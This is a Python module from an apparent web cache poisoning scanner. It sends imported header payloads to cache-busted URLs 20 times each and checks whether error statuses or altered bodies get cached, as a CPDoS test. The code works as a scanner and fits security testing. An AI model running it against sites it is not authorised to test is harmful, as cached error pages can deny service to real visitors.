#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning Denial of Service (CpDoS) error based
https://cpdos.org/
"""

from ..utils import *
from ..lists.payloads_errors import payloads_keys


def check_cached_status(url, s, pk, main_status_code, authent):
    behavior = False
    confirmed = False
    cache_status = False

    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if req.status_code == req_verify.status_code and req.status_code not in [429, 200, 304, 303] or req_verify.status_code not in [429, 200, 304, 303] and req_verify.status_code != main_status_code:
            behavior = True
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code == 304:
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    behavior = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code not in [429, 304]:
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    behavior = True
                    cache_status = True

        if confirmed:
            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
            behavior = False
            confirmed = False
        elif behavior:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
    except Exception as e:
        #print(f"Error : {e}")
        pass


def check_cached_len(url, s, pk, main_len, authent):
    behavior = False
    confirmed = False
    cache_status = False

    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, allow_redirects=False, auth=authent, timeout=10)
        req_verify = s.get(url, verify=False, allow_redirects=False, auth=authent, timeout=10)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if len(req.content) == len(req_verify.content) and len(req_verify.content) != main_len:
            behavior = True
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif len(req.content) != len(req_verify.content):
            for rh in req_verify.headers:
                if "age" in rh.lower():
                    behavior = True
                    cache_status = True
                else:
                    behavior = True
                    cache_status = False

        if confirmed:
            print(f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
            behavior = False
        elif behavior:
            print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError {main_len}b > {len(req.content)}b | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
    except Exception as e:
        #print(f"Error : {e}")
        pass

def get_error(url, s, main_status_code, main_len, authent):

    blocked = 0
    for pk in payloads_keys:
        uri = f"{url}{random.randrange(999)}"
        try:
            req = s.get(uri, headers=pk, verify=False, auth=authent, timeout=10, allow_redirects=False)
            len_req = len(req.content)

            if req.status_code == 888:
                print(f"\033[33m └── [INTERESTING BEHAVIOR]\033[0m | CPDoSError 888 response | CACHE: N/A | \033[34m{url}\033[0m | PAYLOAD: {pk}")
                check_cached_status(uri, s, pk, main_status_code, authent)
            elif req.status_code == 403 or req.status_code == 429:
                uri_403 = f"{url}{random.randrange(999)}"
                req_403_test = requests.get(uri_403, verify=False, auth=authent, timeout=10, allow_redirects=False)
                if req_403_test.status_code == 403 or req_403_test.status_code == 429:
                    blocked += 1

            elif blocked < 3 and req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
                check_cached_status(uri, s, pk, main_status_code, authent)
            elif blocked < 3 and req.status_code == 200:
                if len(str(main_len)) <= 5 and main_len not in range(len_req - 1000, len_req + 1000):
                    check_cached_len(uri, s, pk, main_len, authent)
                elif len(str(main_len)) > 5 and main_len not in range(len_req - 10000, len_req + 10000):
                    check_cached_len(uri, s, pk, main_len, authent)
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            #print(f"Error : {e}")
            pass
        uri = url


if __name__ == '__main__':
    url_file = sys.argv[1]
    s = requests.Session()
    s.headers.update({'User-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko'})
    #get_error(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            url = f"{url}?cb="
            try:
                req_main = s.get(url, verify=False, timeout=10, allow_redirects=False)
                main_len = len(req_main.content)
                main_status_code = req_main.status_code
                authent = False
                get_error(url, s, main_status_code, main_len, authent)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except:
                pass
            print(f" {url}", end='\r')